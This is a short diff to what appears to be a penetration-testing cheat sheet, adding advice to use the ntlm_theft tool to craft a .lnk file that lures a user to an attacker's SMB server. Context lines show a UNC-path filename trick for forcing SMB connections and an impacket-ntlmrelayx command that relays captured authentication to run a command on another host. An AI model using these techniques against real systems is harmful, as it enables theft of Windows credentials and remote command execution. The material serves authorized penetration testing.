@@ -844,6 +844,8 @@ Host an smb server to catch smb credentials. Hashes will be found in `./outfile.
 From target machine, initiate an smb connection.  
 Alternatively, force machine to initiate an smb connection with web uploads i.e. filename `//<host-ip>/tmp`  
 
+If restricted to execution of files only, try [ntlm-theft](https://github.com/Greenwolf/ntlm_theft) to create a `.lnk` file that prompts the user to browse your smbserver.  
+
 ## Net-NTLM relay
 	impacket-ntlmrelayx --no-http-server -smb2support -t 123.123.123.130 -c <command>
 listen for smb connections and relay them to 123.123.123.130 and execute command there  
